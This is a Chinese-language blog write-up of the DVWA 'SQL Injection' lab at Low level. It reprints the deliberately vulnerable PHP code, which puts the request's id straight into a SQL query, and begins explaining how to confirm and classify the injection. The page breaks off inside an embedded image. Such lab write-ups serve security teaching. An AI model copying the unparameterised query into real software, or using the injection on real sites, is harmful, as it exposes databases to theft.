<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="generator" content="VuePress 2.0.0-rc.19">
    <script>
      (function() {
        const userMode = localStorage.getItem('vuepress-reco-color-scheme') || 'auto';
        const systemDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

        if (userMode === 'dark' || (userMode === 'auto' && systemDarkMode)) {
          document.documentElement.classList.toggle('dark', true);
        }
      })();
    </script>
    <link rel="icon" href="/favicon.ico"><title>DVWA - SQL Injection | P-Lab</title><meta name="description" content="boom!">
    <link rel="preload" href="/blog/assets/style-Di8bWRpf.css" as="style"><link rel="stylesheet" href="/blog/assets/style-Di8bWRpf.css">
    <link rel="modulepreload" href="/blog/assets/app-Dh5bFHR3.js"><link rel="modulepreload" href="/blog/assets/Lab7_SQL_Injection.html-B3EjceKM.js">
    <link rel="prefetch" href="/blog/assets/timeline.html-BpJqVQ23.js" as="script"><link rel="prefetch" href="/blog/assets/posts.html-CVZnDnIj.js" as="script"><link rel="prefetch" href="/blog/assets/friendship-link.html-BDhggFA8.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-Dy1t5pBp.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-SAUOxqao.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-DCozlfE9.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-Bad53OW_.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-DnJ90CbL.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-Dlg2X1ab.js" as="script"><link rel="prefetch" href="/blog/assets/2.html-Zlt_23n0.js" as="script"><link rel="prefetch" href="/blog/assets/3.html-UwZ4rInA.js" as="script"><link rel="prefetch" href="/blog/assets/4.html-Xriu8p1I.js" as="script"><link rel="prefetch" href="/blog/assets/5.html-CXwkHIdM.js" as="script"><link rel="prefetch" href="/blog/assets/6.html-skPDmVOo.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-DUm0IX-x.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-CSadYAkJ.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-BiDYmkho.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-UyTEKEmr.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-DITlg3eU.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-CB2JiRmm.js" as="script"><link rel="prefetch" href="/blog/assets/2.html-D2q6-Vns.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-CHTUa1Ej.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-BeWVel8i.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-nnrNBH7o.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-BWb8LG1s.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-CKma1_bG.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-frzMZ8FH.js" as="script"><link rel="prefetch" href="/blog/assets/2.html-C4b86oLh.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-DveAsXFS.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-CFp963CQ.js" as="script"><link rel="prefetch" href="/blog/assets/2.html-Drat-Y0o.js" as="script"><link rel="prefetch" href="/blog/assets/3.html-BPSItSpc.js" as="script"><link rel="prefetch" href="/blog/assets/4.html-BYdVIW79.js" as="script"><link rel="prefetch" href="/blog/assets/5.html-C9P1MjRy.js" as="script"><link rel="prefetch" href="/blog/assets/6.html-CFOybnje.js" as="script"><link rel="prefetch" href="/blog/assets/7.html-cRNhqFgX.js" as="script"><link rel="prefetch" href="/blog/assets/8.html-B1S9gPgK.js" as="script"><link rel="prefetch" href="/blog/assets/index.html-CiUsyjqZ.js" as="script"><link rel="prefetch" href="/blog/assets/capk01.html-ggJ9P6OV.js" as="script"><link rel="prefetch" href="/blog/assets/debug01.html-G3xPplZ8.js" as="script"><link rel="prefetch" href="/blog/assets/debug02.html-D_5VE_z9.js" as="script"><link rel="prefetch" href="/blog/assets/debug03.html-BBK-DA1R.js" as="script"><link rel="prefetch" href="/blog/assets/ubuntu_new_network_ada_configtion.html-C77xbLVI.js" as="script"><link rel="prefetch" href="/blog/assets/jszt-1.html-BpJPcgIM.js" as="script"><link rel="prefetch" href="/blog/assets/jszt00.html-fcQxahoe.js" as="script"><link rel="prefetch" href="/blog/assets/jszt01.html-DsGx6Mau.js" as="script"><link rel="prefetch" href="/blog/assets/jszt02.html-DgxWIAoU.js" as="script"><link rel="prefetch" href="/blog/assets/jszt03.html-ZhRPJONT.js" as="script"><link rel="prefetch" href="/blog/assets/jp_vn_dns_check.html-Bm2vEbl3.js" as="script"><link rel="prefetch" href="/blog/assets/2022YiR.html-DKyuMPo0.js" as="script"><link rel="prefetch" href="/blog/assets/2023YiR.html-Cabto_15.js" as="script"><link rel="prefetch" href="/blog/assets/xj000.html-D5xudCqL.js" as="script"><link rel="prefetch" href="/blog/assets/xj001.html-NEhX_C2z.js" as="script"><link rel="prefetch" href="/blog/assets/api.html-DkJHWlpf.js" as="script"><link rel="prefetch" href="/blog/assets/home.html-D_EzJorS.js" as="script"><link rel="prefetch" href="/blog/assets/plugin.html-C23w8IPv.js" as="script"><link rel="prefetch" href="/blog/assets/theme.html-DAGD5rBI.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-CnHpvIXB.js" as="script"><link rel="prefetch" href="/blog/assets/2.html-hytUkNzZ.js" as="script"><link rel="prefetch" href="/blog/assets/3.html-hrj7wYJ9.js" as="script"><link rel="prefetch" href="/blog/assets/4.html-AyACjPZ0.js" as="script"><link rel="prefetch" href="/blog/assets/6.html-CU-0X8NY.js" as="script"><link rel="prefetch" href="/blog/assets/7.html-2pXcDAeP.js" as="script"><link rel="prefetch" href="/blog/assets/8.html-l22iOACL.js" as="script"><link rel="prefetch" href="/blog/assets/9.html-C1vdzc7B.js" as="script"><link rel="prefetch" href="/blog/assets/002.html-BCpQRa2w.js" as="script"><link rel="prefetch" href="/blog/assets/test01.html-pZqNazig.js" as="script"><link rel="prefetch" href="/blog/assets/test02.html-AUbrL6oG.js" as="script"><link rel="prefetch" href="/blog/assets/test03.html-C0HW1O_m.js" as="script"><link rel="prefetch" href="/blog/assets/test04.html-B6glHKqW.js" as="script"><link rel="prefetch" href="/blog/assets/test05.html-DaMFk1Wk.js" as="script"><link rel="prefetch" href="/blog/assets/test06.html-CIGXVo6F.js" as="script"><link rel="prefetch" href="/blog/assets/test07.html-CCviLeQS.js" as="script"><link rel="prefetch" href="/blog/assets/test08.html-BlF9Ne-b.js" as="script"><link rel="prefetch" href="/blog/assets/test09.html-CMjp-vQg.js" as="script"><link rel="prefetch" href="/blog/assets/test10.html-DIMeUny0.js" as="script"><link rel="prefetch" href="/blog/assets/test11.html-CWwiewQK.js" as="script"><link rel="prefetch" href="/blog/assets/test12.html-WDviix5r.js" as="script"><link rel="prefetch" href="/blog/assets/test13.html-DYNAvM7S.js" as="script"><link rel="prefetch" href="/blog/assets/test14.html-BvsLuY6m.js" as="script"><link rel="prefetch" href="/blog/assets/2_GFS.html-UZEnyGST.js" as="script"><link rel="prefetch" href="/blog/assets/5_Hadoop.html-DoewUK_x.js" as="script"><link rel="prefetch" href="/blog/assets/lab2.html-7CLamck5.js" as="script"><link rel="prefetch" href="/blog/assets/xxbj1.html-CGmZOdTE.js" as="script"><link rel="prefetch" href="/blog/assets/xxbj2.html-D7ewMyZ9.js" as="script"><link rel="prefetch" href="/blog/assets/xxbj3.html-kWD7ikUI.js" as="script"><link rel="prefetch" href="/blog/assets/1_Basic.html-v3l0CwPU.js" as="script"><link rel="prefetch" href="/blog/assets/2_Nmap.html-DJaLI57t.js" as="script"><link rel="prefetch" href="/blog/assets/st0.html-Y5UUsDUE.js" as="script"><link rel="prefetch" href="/blog/assets/st1.html-CQXAhpTC.js" as="script"><link rel="prefetch" href="/blog/assets/st2.html-CiZNM1xY.js" as="script"><link rel="prefetch" href="/blog/assets/1.html-CMxZQwSx.js" as="script"><link rel="prefetch" href="/blog/assets/2.html-jJr_2h3z.js" as="script"><link rel="prefetch" href="/blog/assets/3.html-B3VM1gxa.js" as="script"><link rel="prefetch" href="/blog/assets/5.html-BJLOA3st.js" as="script"><link rel="prefetch" href="/blog/assets/6.html-C-8QxIhc.js" as="script"><link rel="prefetch" href="/blog/assets/1_Vue_Getstart.html-Bq3ZlTS-.js" as="script"><link rel="prefetch" href="/blog/assets/2_Vue_Commands.html-ywlin1Gz.js" as="script"><link rel="prefetch" href="/blog/assets/3_Vue_Component.html-Bd-Nkjxq.js" as="script"><link rel="prefetch" href="/blog/assets/4_Vue_Slot.html-Bm0_Fmg_.js" as="script"><link rel="prefetch" href="/blog/assets/5_Vue_CLI.html-BH698BxJ.js" as="script"><link rel="prefetch" href="/blog/assets/6_Vue_Router.html-B_Iyli9V.js" as="script"><link rel="prefetch" href="/blog/assets/7_Vue_Vuex.html-CZxmmdG9.js" as="script"><link rel="prefetch" href="/blog/assets/Lab10_CSP_Bypass.html-aaPxLW7J.js" as="script"><link rel="prefetch" href="/blog/assets/Lab11_JavaScript.html-CTB5E4AE.js" as="script"><link rel="prefetch" href="/blog/assets/Lab1_Brute_Force.html-BUFLSaSy.js" as="script"><link rel="prefetch" href="/blog/assets/Lab2_Command_Injection.html-D9blD3gH.js" as="script"><link rel="prefetch" href="/blog/assets/Lab3_CSRF.html-D6zzDCg9.js" as="script"><link rel="prefetch" href="/blog/assets/Lab4_File_Inclusion.html-CCihZNrY.js" as="script"><link rel="prefetch" href="/blog/assets/Lab5_FileUpload.html-BEYAhM9b.js" as="script"><link rel="prefetch" href="/blog/assets/Lab6_Insecure_CAPTCHA.html-Dh0pkH0E.js" as="script"><link rel="prefetch" href="/blog/assets/Lab8_Weak_Session_IDs.html-CMK6TLWB.js" as="script"><link rel="prefetch" href="/blog/assets/Lab9_XSS.html-oz9MHCfw.js" as="script"><link rel="prefetch" href="/blog/assets/404.html-LwC5kAsb.js" as="script"><link rel="prefetch" href="/blog/assets/Valine.min-_LyT3bfY.js" as="script"><link rel="prefetch" href="/blog/assets/giscus-aTimukGI-DWEKOTfS.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><div class="theme-container series--no show-catalog"><header class="navbar-container not-open"><div class="navbar-inner"><div class="site-brand nav-item"><img class="logo" src="/blog/logo.jpg" alt="P-Lab"><a href="/blog/" class="site-name can-hide">P-Lab</a></div><div class="nav-item navbar-links-wrapper" style=""><div><form class="search-box" role="search"><input type="search" autocomplete="off" spellcheck="false" value><!----></form></div><nav class="navbar-links"><!--[--><div class="navbar-links__item"><a href="/blog/" class="link" aria-label="主页"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->主页<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/blog/categories/jishuzatan/1.html" class="link" aria-label="分类"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->分类<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/blog/tags/Debug/1.html" class="link" aria-label="标签"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->标签<!--]--></span></span><!--[--><!--]--></a></div><!--]--><!----><span class="xicon-container btn-toggle-dark-mode btn--dark-mode navbar-links__item"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:;"><path d="M15 2h2v3h-2z" fill="currentColor"></path><path d="M27 15h3v2h-3z" fill="currentColor"></path><path d="M15 27h2v3h-2z" fill="currentColor"></path><path d="M2 15h3v2H2z" fill="currentColor"></path><path d="M5.45 6.884l1.414-1.415l2.121 2.122l-1.414 1.414z" fill="currentColor"></path><path d="M23 7.58l2.121-2.12l1.414 1.414l-2.121 2.121z" fill="currentColor"></path><path d="M23.002 24.416l1.415-1.414l2.12 2.122l-1.413 1.414z" fill="currentColor"></path><path d="M5.47 25.13L7.59 23L9 24.42l-2.12 2.12l-1.41-1.41z" fill="currentColor"></path><path d="M16 8a8 8 0 1 0 8 8a8 8 0 0 0-8-8zm0 14a6 6 0 0 1 0-12z" fill="currentColor"></path></svg></span><ul class="social-links navbar-links__item"><!--[--><li class="social-item"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" style="width:25px;height:25px;"><path d="M16 2a14 14 0 0 0-4.43 27.28c.7.13 1-.3 1-.67v-2.38c-3.89.84-4.71-1.88-4.71-1.88a3.71 3.71 0 0 0-1.62-2.05c-1.27-.86.1-.85.1-.85a2.94 2.94 0 0 1 2.14 1.45a3 3 0 0 0 4.08 1.16a2.93 2.93 0 0 1 .88-1.87c-3.1-.36-6.37-1.56-6.37-6.92a5.4 5.4 0 0 1 1.44-3.76a5 5 0 0 1 .14-3.7s1.17-.38 3.85 1.43a13.3 13.3 0 0 1 7 0c2.67-1.81 3.84-1.43 3.84-1.43a5 5 0 0 1 .14 3.7a5.4 5.4 0 0 1 1.44 3.76c0 5.38-3.27 6.56-6.39 6.91a3.33 3.33 0 0 1 .95 2.59v3.84c0 .46.25.81 1 .67A14 14 0 0 0 16 2z" fill-rule="evenodd" fill="currentColor"></path></svg></li><!--]--></ul></nav><span class="xicon-container btn-toggle-menus"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:;"><circle cx="16" cy="8" r="2" fill="currentColor"></circle><circle cx="16" cy="16" r="2" fill="currentColor"></circle><circle cx="16" cy="24" r="2" fill="currentColor"></circle></svg></span></div></div></header><!----><!----><!----><div class="theme-main" style=""><!----><!--[--><main class="page-container"><div class="page-content"><h1 class="page-title">DVWA - SQL Injection</h1><div class="page-info"><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M16 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7z" fill="currentColor"></path><path d="M26 30h-2v-5a5 5 0 0 0-5-5h-6a5 5 0 0 0-5 5v5H6v-5a7 7 0 0 1 7-7h6a7 7 0 0 1 7 7z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->PPPerryPan<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->2022-05-26<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M11.17 6l3.42 3.41l.58.59H28v16H4V6h7.17m0-2H4a2 2 0 0 0-2 2v20a2 2 0 0 0 2 2h24a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2H16l-3.41-3.41A2 2 0 0 0 11.17 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[--><!--[--><a href="/blog/categories/xuexibiji/1.html" class="">学习笔记</a><!--]--><!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M10 14a4 4 0 1 1 4-4a4.005 4.005 0 0 1-4 4zm0-6a2 2 0 1 0 1.998 2.004A2.002 2.002 0 0 0 10 8z" fill="currentColor"></path><path d="M16.644 29.415L2.586 15.354A2 2 0 0 1 2 13.941V4a2 2 0 0 1 2-2h9.941a2 2 0 0 1 1.414.586l14.06 14.058a2 2 0 0 1 0 2.828l-9.943 9.943a2 2 0 0 1-2.829 0zM4 4v9.942L18.058 28L28 18.058L13.942 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[--><!--[--><a href="/blog/tags/wangluoanquan/1.html" class="">网络安全</a><!--]--><!--]--></span></span><!----></div><div class="theme-reco-md-content"><div><h2 id="low" tabindex="-1"><a class="header-anchor" href="#low"><span>Low</span></a></h2><h3 id="源代码" tabindex="-1"><a class="header-anchor" href="#源代码"><span>源代码</span></a></h3><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;Submit&#39;</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token comment">// Get input</span></span>
<span class="line">    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">&#39;id&#39;</span> <span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token comment">// Check database</span></span>
<span class="line">    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;<span class="token interpolation"><span class="token variable">$id</span></span>&#39;;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">&#39;&lt;pre&gt;&#39;</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;&lt;/pre&gt;&#39;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">    <span class="token comment">// Get results</span></span>
<span class="line">    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">        <span class="token comment">// Get values</span></span>
<span class="line">        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;first_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line">        <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;last_name&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span></span>
<span class="line"></span>
<span class="line">        <span class="token comment">// Feedback for end user</span></span>
<span class="line">        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;&quot;</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;___mysqli_ston&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token delimiter important">?&gt;</span></span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="代码分析" tabindex="-1"><a class="header-anchor" href="#代码分析"><span>代码分析</span></a></h3><p>由代码可知，通过<code>REQUEST</code>方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。</p><p><strong>常见注入测试的POC：</strong></p><p><img src="/blog/assets/webp-WrHeTV6W.png" alt="img"></p><h3 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用"><span>漏洞利用</span></a></h3><p>判断是否存在注入，注入是字符型还是数字型</p><p>随便输入一个数字，比如 2 ，查询成功</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA2IAAAC/CAYAAACc52/+AAAOrUlEQVR4nO3df4iUd37A8U9aGXOw/yzChgpd45WeDTmpmAxSLQHhtGCyKmShHP4I6bnpH72qQULAbENJ14NwlYum/7RrT2oSuD8UXL0cZe/gaCEesiI5bAIWErMeCFlO5o8daNx/0j92J86Mz+zO7M58Z2fm9QJh55lnvs93R4R5+3yfZx4rFotfB1Dmf+Lfvve38R//l/HUt74br/zLu/HSn+WSz4rVqBj/9Y9/FSd/mfHUhu/Hv/77D+O730o+KQBgFZqdna14vKZN84BV7I9i064no+/KF1GMiIhcrPvTzfHM7u/HS3v/Ip7sa/P0WEV+H7+f/U58Z+CL+N+ZuYiI6NvwTGx/4aX44V8/E+v+sM3TAwBWrcecEQMAAGit6jNif9CmeQAAAPQsIQYAAJCYEAMAAEhMiAEAACQmxAAAABITYgAAAIkJMQAAgMSEGAAAQGJCDAAAIDEhBgAAkJgQAwAASEyIAQAAJCbEAAAAElvTikH7+vpaMSwAAEDTFYvF5MdsSYhFRHw1N9eqoQEAAJri8VyuLce1NBEAACAxIQYAAJCYEAMAAEhMiAEAACQmxAAAABITYgAAAIkJMQAAgMSEGAAAQGJCDAAAIDEhBgAAkJgQAwAASEyIAQAAJCbEAAAAEhNiAAAAiQkxAACAxIQYAABAYkIMAAAgMSEGAACQmBADAABITIgBAAAkJsQAAAASE2IAAACJCTEAAIDEhBgAAEBiQgwAACAxIQYAAJCYEAMAAEhMiAEAACS2pt0TYGXeHB1t9xSgwltjY5nbZ778Mq5MTMTdu3cTz2h1GhwcjL379sXAE0+0eyoAQBsIsQ725uhovP322+2eBlR4/fXXM2PsysREPPXUU3HgwIE2zGr1uXnzZlyZmIgjr7zS7qkAAG1gaSKQxN27d2Pr1q3tnsaqsXXrVmcHAaCHCTEAAIDEhBgAAEBiHR9it87mY9uxibif9eTMRLyaz8fZj1PPat6ts/nYdvbWww0fn4lt+Xzmn3bNEQAASK/jQ6zz7Ig3PpyK61Nlfz4cjTsj+Xj1amZOQm+6cTr6+/sr//x4quFhZi4djv7+09H4K5ccOS6+3B+HL8083HTvYhxexhwBgN4jxFaDgX3xk/GDce2tf4orM0vvDt1u5tLh6N/12xj/pBCFQunP7Rj/dHf0v3wxVsc/k4EYPl+ICy8OLDyeiYtvjMTVts4JAOgUvRdi1csDM5Y13jpbvmzweFUc3Y8rx/Jx9ur8ssemLSvccjDe2P5RnPrZw6WM968er73sErrWTPz3z6/G0Ll/juH15dsHYvjUeAxdHon3brRrbgAAzdFbIfbxmdg2cqdsaeB/xhsxFnvKruO6dTYfR947GOdKywbHN8ap5x+NrQ/e+nXsXBjn6JZmTG5dbPyTiPjs82/Ca93QO3H9zL5Y14zhoWNMx/TlGk+tH44LhUKceHbh8Y3Tjy47vHcxDvf3x+mqWJu+dLhsmWPla2YuHY7+ly/GVMU+h+PivdLSxoVtFWfjypcmTsXp/k0xcjkifrS7RUshAYBu0lMhdv93dyJiY2wsrSSKdbH3zFRcP7p5/uHMRPz0vYgD48dic2mXLcfi3KGID85XnZk69IPYOxBNtX7jjuYOCB0pH8+djLh6ZFMTlyGOxcjP98bthWWOkyfHYnd1LF0eid2f//3CMsjJGI2rMfJ0f2wq33Z5JDZlXgOWjxOF2zG+PyJOTkahcCLyTZk3ANCteirE1m3bGdvj/ThSYznh/eu/jmtxMHZWneHa/NzBiGtfxL2ybds3rg+gNfKvFWLyZERcHolNZTfrqD7LVb+hGD81HKX/O8m/NhmjMRbvlt9oI4Zi/EApn+ZjMGI0Jl+r2vbp9Cq5Rg0A6GQ9EGI74slSMw3si59M/TQORMQHI7WuAZsPtYrryEbeTzLTe3c+SnIc6AT51wplZ6fmje16dFlhXfbvjecq/u9k4azb59Nl2/48NpTts+HbQxH7N8SG5UweAGAJa9o9gZVav3FHxGc1nrz3RVyLiJ0VGzfH0ampOBoREbfibP5v4tTzZ2Lj1LGY/wx2MM5NlS1NTOZ+3PksYvv3/tI1YVAhHycKhTgRMX9N2K6xePfSobK7FQIAdJ6OPyO27o83PrJssOT+7+5EbN8ZO2p+XtscRz8cje1xJ+7MLIy18HPFOCnuXvjx+3Hq2o7YuU2GQU3PHorx/dVnspZjJqY/bcqMAACWpeNDbP627+/HkepQ+vhM7Hnrozjw8sO7Dt6/ejy25c/ErbLdbv1sLK6VYm3LsTh36KM49XzZPjMTMVY1TtPNTMSrI+/H9jf/oek3AIGOc+P0N3csrGXo2+ULBn8b0+X73pt+9Lu8Lk9HZbrN35mxchwAgHQ6fmli6c6HG8/mY09+rGz7jnjjw6mKsFk39E78Io7Hnnz5/cwOxrmph5G1+ehUnIt8HMk/vC7swHizblEfEfFRnHo+H6eqtmYd4/7V47HnVzvjF25hTy959lCM7x+LkadPx4bquw/eeC9GLo/G5PmFf9jrN8RQjMWV38zE8IsDETEVp3eNZQw6Frtf3hC3z8/fsGPqx7tjLEZj0vJGAKBNuiDE5m0+OhXXjy6937qhd+L60ErGmg+/vfXOqXzDlmNxfepYHa9cOFIdc4XuMxDD5wvx3AuHY1N/f+VTJyejUChLs/XDceGX09G/a1P0H4mIGIrxTyZj9Ondla/bPx6TL1yJTf0j3zy+XXh4F8WmzfvvRmNk1+7o/9FQjH9yoeoLqQEAHuqaEAO6y8CLF6LwYh07PnsiCoUTldsKhYxxhmuOl3WsrG351wpRNnIMny/E8FJzAQDI0PnXiAEAAHQYIQYAAJCYEAMAAEhMiAEAACQmxAAAABITYkASg4ODcfPmzXZPY9W4efNmDA4OtnsaAECbPFYsFr9u9qB9fX3x1dxcs4clw5ujo+2eAlR4ayzrC5UjZr78Mq5MTMTdu3cTz2h1GhwcjL379sXAE0+0eyoA0NMez+WiWCy2/Dizs7MVj4UYAADQs9oVYpYmAgAAJCbEAAAAEhNiAAAAiQkxAACAxIQYAABAYkIMAAAgMSEGAACQmBADAABITIgBAAAkJsQAAAASE2IAAACJCTEAAIDEhBgAAEBiQgwAACAxIQYAAJCYEAMAAEhMiAEAACQmxAAAABITYgAAAImtafcEVmptLvfItgdzc0s+18o5tOIYAABA9+j4ECuPruoAejA398j2rP1WImu8Zh8DAADoLj23NLEUZwAAAO3ScyFWy9pcTqABAABJCLEVsgQRAABoVMdfI9YszQoq14cBAABLcUasiUQYAABQDyHWJCIMAAColxBrAhEGAAA0oudCrFY0LfeuibW+RwwAAKCWjr9ZR3n0lH4u/5Ln6n1aceZKeAEAAI3o+BBbLKwaia7lBpoliQAAQKN6bmkiAABAuwkxAACAxIQYAABAYkIMAAAgMSEGAACQmBADAABITIgBAAAk1tHfI1bri5Srv9ur+oueaa7qvwfvMwAALK6jQ+zB3FyszeUyw0sMpFH9XteK42YeL0LsAQDQ2bpqaWKtD+kP5u